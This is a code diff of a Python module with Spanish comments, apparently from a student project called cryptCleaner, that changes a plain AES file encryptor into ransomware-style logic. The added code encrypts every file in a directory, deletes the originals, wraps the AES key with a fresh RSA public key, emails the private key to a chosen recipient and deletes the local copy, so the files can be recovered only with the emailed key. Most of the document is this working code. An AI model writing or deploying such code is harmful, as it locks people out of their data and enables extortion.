@@ -1,91 +1,122 @@
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.asymmetric import rsa, padding
+from cryptography.hazmat.primitives import serialization, hashes
 from cryptography.hazmat.backends import default_backend
 import os
-from pathlib import Path
 import logging
+from pathlib import Path
+from src.email_utils import send_private_key_email  # Importar función de envío de email
 
-# Configurar logging para mostrar mensajes detallados
+# Configuración de logging
 logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
 
-# Definir la ruta de la clave como una ruta relativa al directorio del script
-KEY_PATH = Path("C:/Users/kekol/Desktop/TCC/cryptCleaner/key/key.key")
+# Definir rutas de archivos
+KEY_PATH = Path("key/aes_key.key")  # Clave AES encriptada
+PRIVATE_KEY_PATH = Path("key/private_key.pem")
+DIRECTORY_TO_ENCRYPT = Path("data")
 
-# Función para verificar si la clave es válida
-def is_valid_key(key):
-    return len(key) in [16, 24, 32]  # AES permite claves de 128, 192 o 256 bits (16, 24 o 32 bytes)
+# Generar clave RSA y clave AES
+def generate_rsa_key_pair():
+    private_key = rsa.generate_private_key(
+        public_exponent=65537,
+        key_size=2048
+    )
+    public_key = private_key.public_key()
+    save_private_key(private_key)
+    return public_key  # Solo devolver la clave pública para encriptar la clave AES
 
-# Función para generar o leer la clave
-def load_or_generate_key():
-    try:
-        if not KEY_PATH.exists():
-            key = os.urandom(32)  # Generar clave AES de 256 bits
-            # Guardar la clave en formato hexadecimal
-            KEY_PATH.parent.mkdir(parents=True, exist_ok=True)  # Crear directorio si no existe
-            with open(KEY_PATH, 'w') as key_file:
-                key_file.write(key.hex())  # Guardar la clave en formato hexadecimal
-            logging.info(f"Clave generada y guardada en {KEY_PATH}")
-            return key
-        else:
-            with open(KEY_PATH, 'r') as key_file:
-                key_hex = key_file.read()  # Leer la clave en formato hexadecimal
-                key = bytes.fromhex(key_hex)  # Convertir de hexadecimal a bytes
-            logging.info(f"Clave cargada desde {KEY_PATH}")
-            if is_valid_key(key):
-                return key
-            else:
-                logging.error("Clave cargada no es válida.")
-                raise ValueError("Clave cargada no es válida.")
-    except Exception as e:
-        logging.error(f"Error al generar o cargar la clave: {e}")
-        raise
+def save_private_key(private_key):
+    PRIVATE_KEY_PATH.parent.mkdir(parents=True, exist_ok=True)
+    with open(PRIVATE_KEY_PATH, 'wb') as priv_file:
+        priv_file.write(private_key.private_bytes(
+            encoding=serialization.Encoding.PEM,
+            format=serialization.PrivateFormat.TraditionalOpenSSL,
+            encryption_algorithm=serialization.NoEncryption()
+        ))
 
-# Cifrar un archivo
-def encrypt_file(file_path):
-    try:
-        key = load_or_generate_key()
-        iv = os.urandom(16)  # Vector de inicialización
-        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
-        encryptor = cipher.encryptor()
+# Encriptar clave AES con clave pública
+def encrypt_aes_key(aes_key, public_key):
+    encrypted_key = public_key.encrypt(
+        aes_key,
+        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
+    )
+    with open(KEY_PATH, 'wb') as key_file:
+        key_file.write(encrypted_key)
 
-        logging.info(f"Cifrando archivo: {file_path}")
-        with open(file_path, 'rb') as f:
-            plaintext = f.read()
+# Encriptar todos los archivos en el directorio y enviar la clave privada
+def encrypt_directory(directory_path, recipient_email):
+    aes_key = os.urandom(32)  # Generar clave AES
+    public_key = generate_rsa_key_pair()  # Generar par de claves RSA
+    encrypt_aes_key(aes_key, public_key)  # Encriptar la clave AES con la clave pública
 
-        ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+    # Encriptar todos los archivos
+    for file_path in directory_path.rglob('*'):
+        if file_path.is_file() and not file_path.suffix.endswith('.enc'):
+            logging.info(f"Procesando archivo para encriptar: {file_path}")
+            encrypt_file(file_path, aes_key)
 
-        encrypted_file = file_path.with_suffix(file_path.suffix + '.enc')
-        with open(encrypted_file, 'wb') as f:
-            f.write(iv + ciphertext)
+    # Enviar clave privada por correo y eliminarla
+    send_private_key_email(recipient_email, PRIVATE_KEY_PATH)
+    os.remove(PRIVATE_KEY_PATH)  # Eliminar la clave privada del sistema
+    logging.info("Clave privada eliminada del sistema después de enviarla por correo.")
 
-        logging.info(f"Archivo {file_path} cifrado exitosamente como {encrypted_file}")
+# Encriptar un archivo con AES
+def encrypt_file(file_path, aes_key):
+    iv = os.urandom(16)
+    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
+    encryptor = cipher.encryptor()
 
-    except Exception as e:
-        logging.error(f"Error al cifrar archivo {file_path}: {e}")
-        raise
+    with open(file_path, 'rb') as f:
+        plaintext = f.read()
 
+    ciphertext = encryptor.update(plaintext) + encryptor.finalize()
+    encrypted_file_path = file_path.with_suffix(file_path.suffix + '.enc')
+    with open(encrypted_file_path, 'wb') as f:
+        f.write(iv + ciphertext)
 
-def decrypt_file(file_path):
-    try:
-        key = load_or_generate_key()
+    file_path.unlink()  # Eliminar el archivo original
+    logging.info(f"Archivo {file_path} encriptado exitosamente.")
 
-        logging.info(f"Descifrando archivo: {file_path}")
-        with open(file_path, 'rb') as f:
-            iv = f.read(16)  # Leer los primeros 16 bytes que contienen el IV
-            ciphertext = f.read()
+# Desencriptar todos los archivos en el directorio
+def decrypt_directory(directory_path, private_key_text):
+    # Convertir el texto de la clave privada en un objeto de clave privada
+    private_key = serialization.load_pem_private_key(
+        private_key_text.encode('utf-8'),
+        password=None,
+        backend=default_backend()
+    )
 
-        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
-        decryptor = cipher.decryptor()
+    with open(KEY_PATH, 'rb') as key_file:
+        encrypted_aes_key = key_file.read()
 
-        plaintext = decryptor.update(ciphertext) + decryptor.finalize()
+    # Desencriptar la clave AES con la clave privada
+    aes_key = decrypt_aes_key_with_private_key(encrypted_aes_key, private_key)
 
-        # Modificamos la ruta agregando "_decrypted" antes de la extensión original
-        decrypted_file = file_path.with_name(file_path.stem + '_decrypted' + file_path.suffix.replace('.enc', ''))
+    for file_path in directory_path.rglob('*.enc'):
+        logging.info(f"Procesando archivo para desencriptar: {file_path}")
+        decrypt_file(file_path, aes_key)
 
-        with open(decrypted_file, 'wb') as f:
-            f.write(plaintext)
+# Desencriptar clave AES con clave privada
+def decrypt_aes_key_with_private_key(encrypted_aes_key, private_key):
+    aes_key = private_key.decrypt(
+        encrypted_aes_key,
+        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None)
+    )
+    return aes_key
 
-        logging.info(f"Archivo {file_path} descifrado exitosamente como {decrypted_file}")
+# Desencriptar un archivo
+def decrypt_file(file_path, aes_key):
+    with open(file_path, 'rb') as f:
+        iv = f.read(16)
+        ciphertext = f.read()
 
-    except Exception as e:
-        logging.error(f"Error al descifrar archivo {file_path}: {e}")
-        raise
+    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
+    decryptor = cipher.decryptor()
+    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
+
+    decrypted_file_path = file_path.with_suffix('')
+    with open(decrypted_file_path, 'wb') as f:
+        f.write(plaintext)
+
+    file_path.unlink()  # Eliminar el archivo encriptado
+    logging.info(f"Archivo {file_path} desencriptado exitosamente.")
